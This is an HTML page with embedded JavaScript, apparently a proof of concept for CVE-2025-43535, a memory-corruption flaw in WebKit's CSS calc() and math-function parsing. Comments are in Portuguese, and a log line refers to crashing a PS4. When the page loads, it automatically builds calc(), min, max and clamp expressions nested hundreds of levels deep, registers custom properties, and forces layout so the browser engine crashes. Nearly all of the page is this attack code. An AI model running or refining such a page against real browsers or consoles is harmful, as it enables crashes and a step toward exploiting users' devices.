<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — V1 Isolada</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption Parser/Layout (CSS Math)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

// Pausa para permitir que o Event Loop e o GC do WebKit respirem, evitando DoS por OOM
const yieldGC = () => new Promise(r => setTimeout(r, 15));

L("=== CVE-2025-43535 PoC Iniciado (V1 Isolada) ===");

async function variant1_css_calc_deep() {
  L("[V1] CSS calc() deep nesting + complex math (Linear Growth)...");

  const el = document.createElement('div');
  el.style.cssText = 'position:absolute;top:-9999px';
  document.body.appendChild(el);

  const sheet = document.createElement('style');
  document.head.appendChild(sheet);

  // 1. Teste do calc() aninhado (Recursão Linear)
  function makeDeepcalc(depth, unit) {
    if (depth <= 0) return `10${unit}`;
    return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
  }

  // Como o stress no JS foi resolvido, podemos testar profundidades maiores no C++
  const depths = [10, 50, 100, 200, 500]; 
  const units = ['px', 'em', '%']; 

  for (const depth of depths) {
    for (const unit of units) {
      try {
        const calc = makeDeepcalc(depth, unit);
        sheet.textContent = `div.test-calc { width: ${calc}; height: ${calc}; }`;
        el.className = 'test-calc';
        void el.offsetWidth;
        
        el.style.width = calc;
        el.style.height = calc;
        void el.offsetWidth;
      } catch(e) { }
    }
    await yieldGC(); // Respiro para o GC limpar as strings e nós de estilo órfãos
  }

  // 2. Teste das funções matemáticas (Corrigido para evitar explosão de RAM)
  function makeMathNested(depth) {
    if (depth <= 0) return '10px';
    const funcs = ['min', 'max', 'clamp'];
    const f = funcs[depth % 3];
    
    // Recursão apenas no primeiro argumento para manter crescimento O(n) e focar no parser stack
    if (f === 'clamp') {
      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, 100px)`;
    }
    return `${f}(${makeMathNested(depth-1)}, 15px)`;
  }

  // Subindo o limite drasticamente, pois agora a memória aguenta
  L("[V1] Executando loop de profundidade math até 1000...");
  for (let d = 1; d <= 1000; d++) {
    try {
      const expr = makeMathNested(d);
      el.style.width = expr;
      el.style.height = expr;
      void el.offsetWidth;
    } catch(e) {}
    
    if (d % 25 === 0) await yieldGC(); 
  }

  // 3. CSS custom properties (@property)
  L("[V1] Registrando Custom Properties...");
  for (let i = 0; i < 30; i++) {
    try {
      const propName = `--test-prop-${i}`;
      if (typeof CSS !== 'undefined' && CSS.registerProperty) {
        CSS.registerProperty({
          name: propName,
          syntax: '<length>',
          inherits: true,
          initialValue: makeDeepcalc(10, 'px'),
        });
      }
      el.style.setProperty(propName, makeDeepcalc(20, 'px'));
    } catch(e) {}
    if (i % 5 === 0) await yieldGC();
  }

  // Limpeza final
  sheet.textContent = '';
  document.head.removeChild(sheet);
  document.body.removeChild(el);
  L("[V1] Testes do parser CSS concluídos", "ok");
}

async function main() {
  try {
    await variant1_css_calc_deep();
    L("=== EXECUÇÃO FINALIZADA ===", "ok");
    L("Se o PS4 crashear agora, há grande chance de corrupção real no WebKit (não OOM).", "crash");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 300));
</script>
</body>
</html>
